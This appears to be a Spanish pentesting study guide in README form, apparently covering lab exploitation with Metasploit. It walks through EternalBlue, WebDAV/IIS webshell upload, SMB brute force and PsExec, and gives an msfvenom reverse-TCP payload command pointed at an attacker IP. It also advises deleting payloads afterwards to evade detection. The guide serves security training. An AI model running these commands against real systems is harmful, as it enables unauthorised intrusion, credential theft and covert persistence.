+
+
+<p> Se observa que en el puerto 8080 HTTP se encuentra corriendo el servicio de Sun GlassFish Open Source Edition  en su version 4.0  </p>
+<p> Al realizar la busqueda del exploit encontramos un resultado, exploit/multi/http/glassfish_deployer de la fecha 2011-08-04 </p>
+<p> Al ingresar al exploit podemos leer la descripcion del modulo para entender mejor su funcionamiento </p>
+
+<p>  Este módulo inicia sesión en un servidor GlassFish (de código abierto o comercial) utilizando diversos métodos (como eludir la autenticación, credenciales predeterminadas o datos de inicio de sesión proporcionados por el usuario), y despliega un archivo WAR malicioso con el fin de lograr la ejecución remota de código. Se ha probado en GlassFish 2.x, 3.0, 4.0 y Sun Java System Application Server 9.x. Las versiones más reciente no permiten el acceso remoto (Secure Admin) de forma predeterminada, pero este es necesario para la explotación. </p>
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/KzQpYNqJ/229.png" alt="Descripción de la imagen">
+
+ </p>
+
+
+<p> Adicionalmente, podemos observar que el modulo se encuentra configurado de forma automatica para el sistema de windows, pero se puede modificar segun se requiera</p>
+
+
+ </br>
+
+
+
+<p> De igual forma, podemos verificar si el servidor objetivo es vulnerable a una vulnerabilidad específica</p>
+
+
+<p> Usando el modulo de Metasploit <b> exploit(windows/smb/ms17_010_eternalblue) </b></p>
+
+
+<p> Este módulo de Metasploit se utiliza para explotar la vulnerabilidad MS17-010 (EternalBlue) en sistemas Windows que no tienen aplicado el parche de seguridad correspondiente, Este módulo de Metasploit se utiliza para explotar la vulnerabilidad MS17-010 (EternalBlue) en sistemas Windows que no tienen aplicado el parche de seguridad correspondiente </p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/xjMn71Q0/231.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/sg6rSBYt/232.png" alt="Descripción de la imagen">
+
+</p>
+
+<p> Como se puede observar el sistema es vulnerable y tenemos acceso al destino</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/CMRzKq8n/233.png" alt="Descripción de la imagen">
+
+</p>
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/htBjMZ5D/234.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p> Al combinarlo con un payload como windows/x64/meterpreter/reverse_tcp, obtienes una shell Meterpreter en el sistema objetivo con privilegios de SYSTEM (el nivel más alto en Windows), lo que te permite: Ejecutar comandos remotos, Extraer hashes de contraseñas (SAM), Escalar privilegios (aunque ya entrega SYSTEM), Exfiltrar archivos, Pivotear a otros sistemas en la red, Instalar persistencia </p>
+
+
+
+<p> De igual forma es posible apoyarse con herramientas externas </p>
+
+
+
+<h3> :white_check_mark:  Searchsploit</h3>  
+
+
+<p align="center">
+
+ <img src="https://i.postimg.cc/52m1n7w1/230.png" alt="Descripción de la imagen">
+
+ </p>
+
+
+<p> Es una herramienta de línea de comandos incluida en el framework Exploit-DB (Exploit Database), que permite buscar exploits y vulnerabilidades en una base de datos local.</p>
+
+</br>
+
+<h3> :radio_button: Pasos </h3> 
+
+<p> 1. Realizar un escaneo de detección de versiones de servicios y aplicaciones que se ejecutan en puertos abiertos de un sistema objetivo. (nmap -sV). </p>
+<p> 2. Colocar el nombre del servicio del cual se quiere buscar el exploit, teniendo en cuenta los puertos o servicios expuestos. </p>
+<p> &nbsp;&nbsp;&nbsp; • searchsploit [opciones] término de búsqueda.  </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/LX4kBKtx/1.png" alt="Descripción de la imagen">
+</p>
+
+
+<p> 3. Descargar el exploit. </p>
+
+<p >&nbsp;&nbsp;&nbsp; • searchsploit -m [Nombre del exploit]. </p>
+<p> Exploit descargado en el directorio selecionado. </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/tgpFpQM9/3.png" alt="Descripción de la imagen">
+</p>
+
+
+<p> Base de datos de Exploit. </p>
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/t4HpGqGn/5.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+ 
+
+
+
+
+<!----------------------------------------------------------------------------- ## Vulnerabilidades mas conocidas------------------------------------------------------------------------------------------------------------------>
+
+
+
+<h2> :arrow_right: Vulnerabilidades de alto impacto</h2> 
+
+
+
+
+
+
+
+
+<h2> :white_check_mark:  BlueKeep - CVE-2019-0708 </h2> 
+
+
+<h3> RDP </h3> 
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/kM2FFb5w/Blue-Keep.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+
+<p> Es una vulnerabilidad de Use-After-Free (UAF) en el servicio TermDD.sys (Terminal Desktop Device Driver) que implementa el protocolo RDP (Remote Desktop Protocol). Específicamente, el error se encuentra en el canal MS_T120 de la pila de RDP.
+
+Cuando el servidor RDP procesa ciertos paquetes del protocolo de enlace inicial (pre-autenticación), el canal interno para la conferencia T.128/T.120 de Microsoft no valida adecuadamente la existencia de un objeto antes de reutilizarlo, permitiendo que un atacante:</p>
+
+
+
+<p>Establezca una sesión RDP sin autenticación (solo handshake)</p>
+<p>Envíe paquetes específicos que provocan que el kernel libere un objeto</p>
+<p>Continúe haciendo referencia a ese objeto (de ahí el use-after-free)</p>
+<p>Sobrescriba la memoria liberada con datos controlados (pool spraying/heap grooming)</p>
+<p>Obtenga ejecución de código en el contexto del kernel (NT AUTHORITY\SYSTEM)</p>
+
+
+
+
+<h2> :white_check_mark: Pass-the-Hash Attacks </h2> 
+
+
+<h3> Kerberos - NTLM </h3> 
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/CxtGgRRf/265.jpg" alt="Descripción de la imagen">
+  
+</p>
+
+
+
+<p> Un Pass-the-Hash Attack (ataque de paso de hash) es una técnica de explotación en la que un atacante captura el hash NTLM o Kerberos de una cuenta de usuario y lo utiliza para autenticarse en otros sistemas sin necesidad de conocer la contraseña original. Este ataque aprovecha el protocolo Kerberos (utilizado por defecto en entornos Windows) o el protocolo NTLM (usado en versiones antiguas de Windows).</p>
+
+
+
+
+
+<h2> :white_check_mark: Shellshock CVE-2014-6271 - LINUX</h2> 
+
+
+<p> Es una Vulnerabilidad crítica de ejecución remota de comandos en Bash (GNU Bourne Again Shell) que permite a los atacantes ejecutar comandos arbitrarios mediante variables de entorno.</p>
+
+<p><b>• Versiones Afectadas</b>: Bash 1.03 hasta 4.3 </p>
+<p><b>• Gravedad:</b>:  CVSS:9.3 (Crítica) </p>
+
+
+<p><b>Mecánica de Exploitación</b></p>
+
+
+<p>1. Un atacante envía encabezados HTTP especialmente elaborados o variables de entorno</p>
+<p>2. La sintaxis () en variables de entorno se interpreta incorrectamente como definiciones de funciones</p>
+<p>3. El código malicioso se ejecuta antes de que comience la ejecución normal del programa</p>
+
+
+
+
+<!--------------------------------------------------## Escaneo de vulnerabilidades automatizado --------------------------------------------------------------------------->
+
+
+
+<h2> :arrow_right: Escaneo de vulnerabilidades automatizado </h2> 
+
+
+<p> 🛠 Qualys: &nbsp; Vulnerability Management (https://www.qualys.com) Servicio en la nube que permite identificar que sistemas informaticos pueden ser vulnerables a las ultimas amenazas de internet  </p>
+<p> 🛠 Nessus: &nbsp; (https://www.tenable.com) Permite la evaluacion de vulnerabilidades, configuraciones y cumplimiento </p>
+<p> 🛠 GFI LanGuard: &nbsp; Escanea, detecta y evalua las vulnerabilidades en una red y sus dispositivos conectados </p>
+<p> 🛠 OpenVAS &nbsp; (https://www.openvas.org) Escaneo y gestion de vulnerabilidades </p>
+<p> 🛠 Nikto &nbsp; Escaner de servidores web, examina los elementos de configuracion como archivos de indice, opciones habilitades en servidores http e identifica el software instalado   </p>
+
+
+
+
+<p>Lynis: --------------------------------------------------------------------> Profundizar herramienta muy util</p>
+
+
+
+
+
+
+
+
+
+<!--------------------------------------------------## Escaneo de vulnerabilidades con wmap --------------------------------------------------------------------------->
+
+
+
+<h2> :arrow_right: Análisis de vulnerabilidades de aplicaciones web con WMAP </h2> 
+
+
+
+<p> WMAP (Web Map) es una herramienta de escaneo web desarrollada por Acunetix que realiza análisis automatizado de vulnerabilidades en aplicaciones web. Es especialmente útil para identificar problemas de seguridad como XSS, SQLi, CSRF, entre otros. </p>
+
+
+
+<h3> :radio_button: Pasos </h3> 
+
+
+
+<p> 1. Carga el módulo WMAP </p>
+ 
+<p> 2. Configura las opciones básicas </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/fyZMVynC/269.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/xC9wQgLc/270.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+
+<p> 3. Ejecutar escaneo completo </p>
+
+
+<p> opcion wmap_run -t </p>
+
+<p> Ejecuta solo los módulos de tipo "Targeted" (dirigidos). Estos módulos están diseñados para escanear objetivos específicos y detectar vulnerabilidades comunes como SQL Injection, XSS, CSRF, etc. </p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/YCsNMSgG/271.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p> opcion wmap_run -e </p>
+
+<p> Ejecuta solo los módulos de tipo "Exploitation". Estos módulos están diseñados para verificar si las vulnerabilidades detectadas son explotables o no, probando técnicas específicas de explotación. </p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/rFptskqh/272.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/pX15n6Tn/273.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p> 4. Verificar las vulnerabilidades </p>
+
+<p> opcion wmap_vulns </p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/sXRTCXdH/274.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+
+<p> 5. Usar el modulo: auxiliary(scanner/http/http_put)   </p>
+
+
+<p> Este módulo puede aprovechar servidores web mal configurados para subir y eliminar contenido web mediante solicitudes HTTP de tipo PUT y DELETE. Establece ACTION en PUT o DELETE.  PUT es el valor predeterminado.  Si no se especifica el nombre de archivo, el módulo generará una cadena aleatoria como archivo .txt. Si se utiliza DELETE, es obligatorio especificar un nombre de archivo.  </p>
+
+
+
+<p> Nota: en el escaneo realizado se observa que intenta realizar la carga en archivo en la ruta: " / " el cual falla , pero se puede realizar el intento en otro ruta </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/3xXBChD4/276.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/bwg6f8Y5/277.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+
+<h3> &nbsp; Sistemas de puntuacion de vulnerabilidades</h3>
+
+<p> • CVSS - Sistema Común de Puntuación de Vulnerabilidades &nbsp; (https://www.first.org/cvss)</p>
+<p> • CVE  - Vulnerabilidades y Exposiciones Comunes &nbsp; (https://www.cve.org)</p>
+<p> • CWE  - Enumeracion de debilidades comunes &nbsp; (https://cwe.mitre.org)</p>
+<p> • NVD  - Base de datos nacional de vulnerabilidad &nbsp; (https://nvd.nist.gov)</p>
+
+
+<p><b>  Evaluacioon de vulnerabilidades </b></p>
+
+<p> 1. Examinar y evaluar la seguridad fisica de la organizacion </p>
+<p> 2. Comprobar errores de configuracion o errores humanos </p>
+<p> 3. Utilizar herramientas de escaneo de vulnerabilidades </p>
+<p> 4. Identificar y priorizar las vulnerabilidades </p>
+<p> 5. Validar las vulnerabilidades encontradas </p>
+
+<p><b>  Clasificacion de vulnerabilidades </b></p>
+
+<p> • Configuracion erronea </p>
+<p> • Instalacion y configuracion por defecto</p>
+<p> • Desbordamiento de bufer</p>
+<p> • Servidores sin actualizar</p>
+<p> • Fallos de diseño</p>
+<p> • Fallos del sistema operativo </p>
+<p> • Defectos en las aplicaciones</p>
+<p> • Servicios abiertos</p>
+<p> • Contraseñas por defecto</p>
+
+
+
+
+<h3> &nbsp;Ejemplo </h3>
+
+
+
+<p>&nbsp;&nbsp;&nbsp;1. Hacer ping al destino de ataque (host)</p>
+<p>&nbsp;&nbsp;&nbsp;2. Identifique los puertos y servicios abiertos. nmap -sV (host)</p>
+<p>&nbsp;&nbsp;&nbsp;3. Identificar el sistema operativo  sudo nmap -O (host) OS details</p>
+<p>&nbsp;&nbsp;&nbsp;4. Utilice el guion de Nmap Vulners para buscar vulnerabilidades. nmap -sV --script vulners --script-args mincvss=4 (host)</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/dVvB6xKZ/1.png" alt="Descripción de la imagen">
+</p>
+
+</br>
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/VsCW88fb/2.png" alt="Descripción de la imagen">
+</p>
+
+</br>
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/MKJbZFH3/4.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<!--------------------------------------------------## Fase 3 Explotacion --------------------------------------------------------------------------->
+
+
+<!--horizontal divider(gradiant)-->
+<img src="https://user-images.githubusercontent.com/73097560/115834477-dbab4500-a447-11eb-908a-139a6edaec5c.gif">
+
+
+
+
+<div id="user-content-toc">
+  <ul align="center">
+    <summary><a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=50&pause=1000&color=F7608A&width=700&height=600&lines=Fase+3.+Explotacion" alt="Typing SVG" /></a></summary>
+  </ul>
+</div>
+
+
+
+<p> La fase de explotación en una prueba de penetración es el momento en que el atacante intenta aprovechar las vulnerabilidades identificadas durante las fases anteriores para comprometer el sistema objetivo. </p>
+
+
+
+<h2> :arrow_right:  Metodologias para irrumpir sistemas </h2>
+
+
+</br>
+
+<h2> :white_check_mark: &nbsp; Obtener acceso - Initial Access &nbsp; TA0001 </h2>
+
+
+<p> El adversario está intentando entrar en tu red. </p>
+
+
+
+<p> El acceso inicial consiste en técnicas que utilizan varios vectores de entrada para obtener su punto de apoyo inicial dentro de una red. Las técnicas utilizadas para afianzarse incluyen el phishing selectivo y la explotación de debilidades en servidores web públicos. Los puntos de acceso obtenidos a través del acceso inicial pueden permitir el acceso continuo, como cuentas válidas y el uso de servicios remotos externos, o pueden tener un uso limitado debido al cambio de contraseñas. </p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/tJ5pp6FT/305.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/XYX46pq3/310.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+
+<!--------------------------------------------------## Ataques basados en sistema/host  --------------------------------------------------------------------------->
+
+
+</br>
+
+
+<h2> :arrow_right:  Ataques basados en sistema/host </h2>
+
+
+<p> Un ataque basado en host es un ataque dirigido a un sistema especifico o host que ejecuta un sitema operativo especifico (Windows - Linux). Se centran principalmente en la explotacion de vulnerabilidades o configuraciones erroneas en el objetivo. En esta etapa se convierten las vulnerabilidades identificadas durante el escaneo y enumeración en acceso real a los sistemas </p>
+
+
+</br>
+
+
+
+<h2> :white_check_mark: Vulnerabilidades de Windows </h2>
+
+
+<h3> :radio_button: Tipos de vulnerabilidades de Windows </h3>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/hG2vJ4Qr/313.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+
+<h3> :radio_button: Protocolos y servicios mas explotados de Windows </h3>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/VL7CTcRk/314.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+
+<h2> Explotación de vulnerabilidades de Windows </h2>
+
+
+<!----------------------------------------------------------------------------- ## Explotación de Microsoft IIS WebDAV ------------------------------------------------------------------------------------------------------------------>
+
+</br>
+
+<h2> :white_check_mark: Explotación de Microsoft IIS WebDAV </h2>
+
+</br>
+
+
+<h3> :radio_button: Puerto 80 sin TLS / 443 con certificado SSL </h3>
+
+
+<p> (Web Distributed Authoring and Versioning) es una extensión del protocolo HTTP que permite a los usuarios editar y gestionar archivos en servidores web de forma colaborativa. Fue definido en el RFC 4918 y básicamente transforma un servidor web en un sistema de archivos accesible remotamente.</p>
+
+
+<p> Extensiones de archivos ejecutables compatibles</p>
+
+
+<p><b> • .asp  </b></p>
+<p><b> • .aspx </b></p>
+<p><b> • .conf </b></p>
+<p><b> • .php  </b></p>
+
+<p> Para conectarse a un servidor WebDav, debera proporcionar credenciales legitimas, esto se debe a que WebDav implementa autenticaion en forma de usuario y contraseña </p>
+
+
+
+<h3><b> Impactos de Seguridad Clave: </b></h3>
+
+
+
+<p><b> 1. Ejecución Remota de Código (RCE): </b></p>
+
+<p> &nbsp; • Versiones vulnerables permiten ejecutar comandos arbitrarios vía solicitudes DAV maliciosas</p>
+<p> &nbsp; • Atacantes pueden ejecutar comandos como SYSTEM o servicio de red</p>
+
+<p><b> 2. Escalada de Privilegios: </b></p>
+
+<p> &nbsp; • A menudo se ejecuta con altos privilegios (SYSTEM)</p>
+<p> &nbsp; • Puede aprovechar configuraciones incorrectas para escalar acceso</p>
+
+<p><b> 3. Exfiltración de Datos: </b></p>
+
+<p> &nbsp; • Acceso directo al sistema de archivos permite leer archivos sensibles</p>
+<p> &nbsp; • Puede exfiltrar credenciales, archivos de configuración, etc.}</p>
+
+<p><b> 4. Mecanismos de Persistencia:  </b></p>
+
+<p> &nbsp; • Crea backdoors a través de shells web o tareas programadas</p>
+<p> &nbsp; • Modifica claves del registro para persistir</p>
+
+<p><b> 5.Movimiento Lateral: </b></p>
+
+<p> &nbsp; • Servidor comprometido se convierte en punto pivote a redes internas</p>
+<p> &nbsp; • Credenciales almacenadas en servidor pueden permitir acceso a otros sistemas</p>
+
+
+
+<h3> :radio_button: Pasos para su explotacion </h3>
+
+
+<p> 1. Validar si el servicio se encuentra corriendo  </p>
+
+<p> Identificar la version y el servicio </p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/3x8LLJNM/237.png" alt="Descripción de la imagen">
+</p>
+
+
+<p> Se observa que en el puerto 80 tenemos un servidor web ejecutandose el cual corresponde a Microsoft IIS httpd en su version 10.0  </p>
+
+
+<p> 2. Consultar un poco mas de informacion del puerto con la opcion <b>--script=http-enum</b> el cual se utiliza para enumerar directorios y archivos comunes en servidores web. </p>
+
+<p> Se observa que WebDav ha sido configurado para ejecutarse en el servidor web IIS </p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/hvKxSvHW/238.png" alt="Descripción de la imagen">
+</p>
+
+
+
+<p> Al ralizar la validacion en el navegador se observa que el servidor webdav solicita usuario y contraseña como se menciono con anterioridad, si no contamos con dichos datos podemos proceder a realizar un ataque de <b> fuerza bruta </b> </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/MHX6b8BJ/239.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/CMvHFHLJ/315.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+
+<p> Al ingresar las credenciales correctas podremos acceder al contenido del directorio web en el cual por el momento solo cuenta con 2 archivos</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/0j9zc6GD/240.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<p>3.  Con la ayuda de la herramienta <b>davtest</b> podremos identifica y explotar configuraciones inseguras en servidores que tienen habilitado WebDAV.</p>
+
+
+<p> Como se observa en la siguiente imagen cuando intentamos acceder a la URL falla la conexion por no suministrar las credenciales</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/25fLVXqc/241.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p> Al establecer conexion se crea una Cadena aleatoria para esta sesión: <b> GzUzoZM8 </b> </p>
+
+
+<p> Adicionalmente se crar el directorio <b> Created http://10.4.29.41/webdav/DavTestDir_GzUzoZM8 </b> </p>
+
+
+<p> Podemos notar que hemos cargado casi todos los tipos de archivos importantes al directorio /webdav. Además, podemos ejecutar tres tipos de archivos. es decir, asp, texto y html.</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/XqZY2wGy/242.png" alt="Descripción de la imagen">
+  
+</p>
+
+<p> Al comprobar la seccion de ejecucion de archivos de pruebas observamos que se tiene exito en la carga de archicos .asp</p>
+
+
+<p> <b> Verificar la sesion Checking for test file execution </b> </p>
+
+
+<p> <b> Nota </b> Cuando ves archivos .asp en un servidor WebDAV, significa que ese servidor muy probablemente ejecuta IIS (Internet Information Services) de Microsoft. Si puedes subir un archivo .asp a través de WebDAV y el servidor lo ejecuta, puedes obtener ejecución remota de código subiendo una webshell </p>
+
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/sxYyvKtX/243.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p>4. Cargue una puerta trasera .asp en la máquina de destino al directorio /webdav usando la utilidad <b>cadaver</b></p>
+
+
+<p><b>Cadaver es un cliente de línea de comandos para el protocolo WebDAV, diseñado para interactuar con servidores WebDAV de forma similar a como lo harías con un cliente FTP.</b></p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/wjTHjX2b/244.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p>En la imagen se puede observar el punto 4 que indica que es posible interactuar con webdav y el punto 5 donde la conexion webshell se ha establecido con exito</p>
+
+
+
+<p>5.  Subir la puerta trasera asp al servidor web IIS en el directorio webdav.></p>
+
+<p>Hemos subido la puerta trasera con éxito..</p>
+
+
+<p>:white_check_mark: Webshell</p>
+
+
+<p> Es un script malicioso (o de prueba, en el contexto de un pentest autorizado) que se sube a un servidor web para obtener control remoto sobre él a través del navegador o peticiones HTTP.</p>
+
+<p> Es esencialmente una puerta trasera (backdoor) que se ejecuta en el servidor. Te permite enviar comandos del sistema operativo a través de parámetros HTTP (GET, POST, etc.) y ver el resultado en el navegador.</p>
+
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/mrKGj04t/245.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/RVWL5y5Y/246.png" alt="Descripción de la imagen">
+  
+</p>
+ 
+
+
+ <p align="center">
+
+  <img src="https://i.postimg.cc/Fswg9phf/247.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+ 
+ <p align="center">
+
+  <img src="https://i.postimg.cc/wjctSQMp/248.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+
+
+<h3><b> Mitigacion </b></h3>
+
+
+
+<p> &nbsp; • Aplicar parches (MS17-010) </p>
+<p> &nbsp; • Deshabilitar WebDAV si no es necesario </p> 
+<p> &nbsp; • Implementar reglas WAF para patrones específicos de WebDAV </p>
+<p> &nbsp; • Monitorear operaciones WebDAV inusuales </p>
+
+
+<h2> :white_check_mark: Explotación WebDAV con Metasploit </h2>
+
+
+<h3><b> :radio_button: Tecnicas </b></h3>
+
+
+<p> Generar la carga util de ASP. con MSF Venom </p>
+
+
+ <p align="center">
+
+  <img src="https://i.postimg.cc/fyYjjQfz/tools-msfvenom.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+
+<p> MSF Venom es una herramienta de generación de payloads que forma parte del marco Metasploit Framework (MSF). Se utiliza principalmente para crear payloads personalizados que pueden ser ejecutados en sistemas objetivo durante un ataque de penetración. </p>
+
+
+
+ <p align="center">
+
+  <img src="https://i.postimg.cc/qRXYZpg5/316.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p> 1. msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.39.2 LPORT=1234 -f asp > shell.asp </p>
+
+
+<p> -p windows/meterpreter/reverse_tcp: Especifica el payload a usar, en este caso un Meterpreter reverse TCP. </p>
+
+<p> LHOST=10.10.39.2: Define la dirección IP del atacante donde se recibirá la conexión reversa. </p>
+
+<p> LPORT=1234: Define el puerto del atacante donde se recibirá la conexión reversa. </p>
+
+<p>  -f asp: Especifica el formato del payload como ASP (Active Server Pages). </p>
+
+<p> > shell.asp: Redirige la salida del payload al archivo shell.asp. </p>
+
+
+<p> El payload generado será un script ASP que, cuando se ejecute en el sistema objetivo, establecerá una conexión TCP reversa al atacante en la IP 10.10.39.2 y puerto 1234, permitiendo la ejecución de comandos en el sistema objetivo. </p>
+
+
+
+<p> Se recomienda usar carga util meterpreter de 32 bits ya que funcionaria independientemente si el sistema es de 32 o 64 bits  </p>
+
+
+
+<p> 2. Usar Cadaver especificando la URL y la carpeta destino, ingresar usuario y contraseña, lo que nos permitira enumerar los archivos  </p>
+
+
+<p> 3. Con el metodo PUT actualizamos la informacion  </p>
+
+
+ <p align="center">
+
+  <img src="https://i.postimg.cc/BZhxrjDY/317.png" alt="Descripción de la imagen">
+  
+</p>
+
+<p align="center">
+
+  <img src="ttps://i.postimg.cc/LsMftLK5/318.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p> 4. configurar un oyente que recibira la conexion inversa del actual sistema de destino  </p>
+
+
+<p> Iniciar Metasploit  </p>
+
+<p> usar <b> Multi/handler (es un módulo en Metasploit que permite gestionar múltiples conexiones simultáneas desde diferentes payloads. Es especialmente útil en escenarios donde se desea interactuar con múltiples sistemas objetivo o cuando se necesita manejar varios payloads a la vez. Actúa como un listener central que puede aceptar conexiones de diversos payloads, como meterpreter, shell reversa, etc., y proporciona una interfaz única para interactuar con todas ellas.) </b> </p>
+
+
+<p> Usar el mismo payload que se habia especificado para generar el archivo ASP <b> "windows/meterpreter/reverse_tcp" </b></p>
+<p> terminar de configurar los parametros como LHOST y RPORT</p>
+
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/q7xNTFth/319.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+
+<p> Cada vez que se ejecute en el objetivo se conectara nuevamente a este controlado TCP inverso</p>
+
+
+<p> Al hacer click en shell_prueba.asp se puede observar que se esta ejecutando por tal motivo se obtuvo acceso con exito al sistema destino</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/WbSqFzsc/320.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/hjFXW71D/321.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+
+
+<p> En la tecnica manual se recomienta una vez se haya obtenido acceso al sistema destino emininar cualquiere carga util "Metodos http DELETE", con el fin de ser lo mas clandestino posible </p>
+
+
+
+
+
+<h3><b> :radio_button: Tecnicas 2 </b></h3>
+
+
+<p> Automatizar todo el proceso utilizando un modulo del marco de metasploit </p>
+
+
+<p> 1. search iis upload </p>
+<p> 2. Seleccionar el modulo adecuado "exploit/windows/iis/iis_webdav_upload_asp "</p>
+
+<p> Este módulo se puede usar para ejecutar una carga útil en servidores IIS que tengan directorios con permisos de escritura para todos los usuarios. La carga útil se sube como un script ASP mediante una solicitud WebDAV PUT. La máquina IIS de destino debe cumplir estas condiciones para ser considerada como vulnerable: permitir el acceso a recursos de script, permisos de lectura y escritura, y ser compatible con ASP.</p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/vZkBf6kM/322.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/XvLztwbw/323.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+
+<p> Una vez que se autentica con exito va a cargar la carga util y luego renombrara el archivo ASP. donde luego lo ejecutara y eliminara la carga util de metasploit.assp para evitar ser detectado </p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/Jz1gx6wB/324.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+
+<!----------------------------------------------------------------------------- ## Explotación SMB CON PsExec------------------------------------------------------------------------------------------------------------------>
+
+</br>
+
+<h2> :white_check_mark: Explotación SMB CON PsExec </h2>
+
+</br>
+
+
+<h3> :radio_button: Puerto 445 </h3>
+
+
+<p> PsExec es una herramienta de Microsoft que permite ejecutar comandos y programas en máquinas remotas mediante SMB. Se utiliza comúnmente en pentesting para obtener acceso a sistemas remotos. Es un remplazo ligero de telnet, para poderlo usar se deben ingresar credenciales legitimas </p>
+
+
+<p> El protocolo SMB utliliza dos niveles de autenticacion </p>
+
+
+
+<p> &nbsp; • User Authentication</p>
+<p> &nbsp; • Share Authentication </p> 
+
+
+
+<p><b> • User Authentication</b> Los usuarios deben proportcionar un nombre de usuario y contraseña para autenticarse en un servidor SMB </p>
+<p><b> • Share Authentication</b> El usuario debe proporcionar una contraseña para acceder al recurso compartido restringido</p> 
+
+
+
+
+
+<p> :radio_button: User Authentication</p>
+
+
+<p>1.  Realizar un escanero con Nmap para idetificar los puertos abiertos </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/cHjvj1DR/325.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p> Se puede oservar que se encuentra corriendo la version 2 de SMB en el puerto 445 del servidor </p>
+
+
+
+<p> Se puede oservar que se encuentra corriendo la version 2 de SMB en el puerto 445 del servidor </p>
+
+
+<p> “Message signing enabled but not required” significa que el servidor puede firmar los mensajes SMB (añadir una firma criptográfica para verificar su autenticidad), pero no exige que los clientes lo hagan. </p>
+
+
+<p> Lo que significa que podemos autenticarnos el el sistema a traves de PsExec </p>
+
+
+
+<p>2.  Realizar un ataque de fuerza bruta </p>
+
+
+<p>Usar el modulo de metasploit <b>auxiliary/scanner/smb/smb_login</b> Este módulo probará un inicio de sesión SMB en una variedad de máquinas y informar inicios de sesión exitosos. Si ha cargado un complemento de base de datos y conectado a una base de datos, este módulo registrará correctamente inicios de sesión y hosts para que pueda realizar un seguimiento de su acceso. </p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/sghvLGqJ/326.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/mDLHH2kP/327.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+
+<p>Se han identificado 4 cuentas de usuario con contraseña, en particular la cuenta de administrador </p>
+
+
+<p> Podemos utilizar estas credenciales para autenticarnos en el sistema a traves de PsExec </p>
+
